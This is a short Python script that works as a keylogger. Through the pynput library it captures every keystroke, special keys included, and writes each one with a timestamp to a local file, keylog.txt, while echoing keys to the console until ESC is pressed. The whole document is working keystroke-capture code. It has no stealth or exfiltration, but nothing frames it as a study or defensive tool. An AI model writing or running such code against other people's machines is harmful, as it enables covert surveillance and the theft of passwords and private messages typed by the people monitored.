import os
import logging
from pynput import keyboard

log_file_path = "keylog.txt"

# Create the keylog.txt file if it doesn't exist
if not os.path.exists(log_file_path):
    open(log_file_path, 'w').close()

# Set up logging configuration
logging.basicConfig(filename=log_file_path, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f'{key.char}')
        print(f'Key pressed: {key.char}')  # Debugging print
    except AttributeError:
        logging.info(f'[{key}]')
        print(f'Special key pressed: {key}')  # Debugging print

def on_release(key):
    print(f'Key released: {key}')  # Debugging print
    if key == keyboard.Key.esc:
        return False

print("Keylogger is running... Press ESC to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
